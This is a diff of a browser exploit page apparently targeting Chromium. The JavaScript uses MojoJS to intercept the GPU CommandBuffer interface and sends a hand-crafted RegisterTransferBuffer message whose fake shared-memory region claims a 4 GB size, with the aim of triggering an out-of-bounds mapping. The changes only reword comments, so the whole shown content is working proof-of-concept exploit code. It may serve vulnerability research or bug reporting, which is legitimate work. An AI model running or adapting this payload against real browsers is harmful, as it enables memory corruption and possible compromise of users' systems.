@@ -6,40 +6,36 @@
 <script>
 (async function() {
   try {
-    // 1. Intercept the gpu.mojom.CommandBuffer request that will be created
-    //    when we create a WebGL context.
+    // 1. Intercept the gpu.mojom.CommandBuffer request created when we get a WebGL context
     const interceptor = new MojoInterfaceInterceptor('gpu.mojom.CommandBuffer', 'process');
     interceptor.oninterfacerequest = (e) => {
       interceptor.stop();   // only need one
 
-      // e.handle is the Mojo handle that the browser will use to send requests.
-      // We'll bind it and send our malicious message.
+      // e.handle is the Mojo handle the browser will use to send requests
       const remote = new gpu.mojom.CommandBufferPtr(e.handle);
 
       // 2. Craft the raw message for ordinal 4 (RegisterTransferBuffer)
       const payload = new ArrayBuffer(256);
       const view = new DataView(payload);
 
-      // --- RegisterTransferBuffer_Params_Data (24 bytes) ---
-      view.setUint32(0, 24, true);         // header: size = 24
-      view.setUint32(4, 0, true);          // version = 0
-      view.setInt32(8, 0x1234, true);      // id (arbitrary non-zero)
-      view.setUint32(12, 0, true);         // padding
-      // pointer to SharedMemoryRegion (relative offset)
-      const regionOffset = 0x40 - 0x10;    // points to offset 0x40 in the buffer
+      // RegisterTransferBuffer_Params_Data (24 bytes)
+      view.setUint32(0, 24, true);          // header: size = 24
+      view.setUint32(4, 0, true);           // version = 0
+      view.setInt32(8, 0x1234, true);       // id (any non‑zero value)
+      view.setUint32(12, 0, true);          // padding
+
+      // Pointer to SharedMemoryRegion (relative offset)
+      const regionOffset = 0x40 - 0x10;     // points to offset 0x40 in the buffer
       view.setBigInt64(16, BigInt(regionOffset), true);
 
-      // --- Fake SharedMemoryRegion at offset 0x40 ---
-      // Header: size=24, version=0 (for a typical region struct)
-      view.setUint32(0x40, 24, true);
-      view.setUint32(0x44, 0, true);
-      // Handle index: we attach one shared buffer handle; its index will be 0
-      view.setUint32(0x48, 0, true);       // handle index
-      view.setUint32(0x4C, 0, true);       // padding
-      // Huge size -> out-of-bounds mapping
-      view.setBigUint64(0x50, BigInt(0x100000000), true); // 4 GB
+      // Fake SharedMemoryRegion at offset 0x40
+      view.setUint32(0x40, 24, true);       // struct header: size = 24
+      view.setUint32(0x44, 0, true);        // version = 0
+      view.setUint32(0x48, 0, true);        // handle index (0 = first attached handle)
+      view.setUint32(0x4C, 0, true);        // padding
+      view.setBigUint64(0x50, BigInt(0x100000000), true); // huge size → OOB mapping
 
-      // Create a small valid shared buffer to attach
+      // Create a small valid shared buffer to attach (4 KB)
       const sharedBuffer = Mojo.createSharedBuffer(4096);
       const handles = [sharedBuffer.handle];
 
@@ -50,13 +46,12 @@
 
     interceptor.start();
 
-    // 4. Trigger command buffer creation by obtaining a WebGL context
+    // 4. Create a WebGL context to trigger command buffer creation
     const canvas = document.createElement('canvas');
     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
     if (!gl) throw new Error('WebGL not available');
 
-    // The interceptor callback will fire asynchronously when the browser
-    // creates the command buffer. Give it a moment.
+    // Wait briefly for the interceptor to fire
     await new Promise(resolve => setTimeout(resolve, 1000));
 
   } catch (err) {
